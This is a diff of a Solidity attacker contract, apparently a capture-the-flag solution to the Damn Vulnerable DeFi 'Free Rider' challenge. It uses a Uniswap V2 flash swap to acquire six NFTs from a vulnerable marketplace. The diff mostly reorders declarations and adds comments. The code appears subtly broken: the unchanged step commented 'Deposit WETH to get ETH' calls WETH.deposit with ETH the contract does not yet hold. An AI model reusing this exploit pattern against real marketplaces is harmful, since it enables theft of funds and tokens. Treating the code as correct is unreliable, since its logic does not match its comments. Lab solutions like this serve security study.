@@ -15,50 +15,50 @@ interface IWETH {
 
 contract FreeRiderAttacker {
     FreeRiderNFTMarketplace private immutable marketplace;
-    IERC721 private immutable NFTs;
     IUniswapV2Pair private immutable uniswapPair;
+    IERC721 private immutable NFTs;
     IWETH private immutable WETH;
-    address payable private immutable attacker;
+
+    address private immutable attacker;
     address private immutable buyer;
+    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];
 
     receive() external payable {}
 
     constructor(
         address payable _marketplace,
-        address payable _NFTs,
         address _uniswapPair,
+        address payable _NFTs,
         address _WETH,
         address _buyer
     ) {
         marketplace = FreeRiderNFTMarketplace(_marketplace);
-        NFTs = IERC721(_NFTs);
         uniswapPair = IUniswapV2Pair(_uniswapPair);
+        NFTs = IERC721(_NFTs);
         WETH = IWETH(_WETH);
-        attacker = msg.sender;
         buyer = _buyer;
+        attacker = msg.sender;
     }
 
     function attack(uint256 _amount) external payable {
         require(msg.sender == attacker);
-        bytes1 data = 1;
+        bytes memory data = "1";
 
         // 1. Do the flash swap to get WETH
         uniswapPair.swap(
             _amount, // amount0 => WETH
             0, // amount1 => DVT
             address(this), // recipient of flash swap
-            data // passed to uniswapV2Call function that uniswapPair triggers on the recipient
+            data // passed to uniswapV2Call function that uniswapPair triggers on the recipient (this)
         );
     }
 
     function uniswapV2Call(
-        address sender,
+        address,
         uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
+        uint256,
+        bytes calldata
     ) external {
-        uint256[] memory tokenIds = [0, 1, 2, 3, 4, 5];
-
         // 2. Deposit WETH to get ETH
         WETH.deposit{value: amount0}();
 
@@ -84,12 +84,13 @@ contract FreeRiderAttacker {
         require(success, "ETH transfer failed");
     }
 
+    // Function that allows this contract to receive NFTs
     function onERC721Received(
         address,
         address,
         uint256,
         bytes memory
-    ) external override returns (bytes4) {
+    ) external view returns (bytes4) {
         require(msg.sender == address(NFTs) && tx.origin == attacker);
         return 0x150b7a02; // ERC721Receiver.onERC721Received.selector
     }
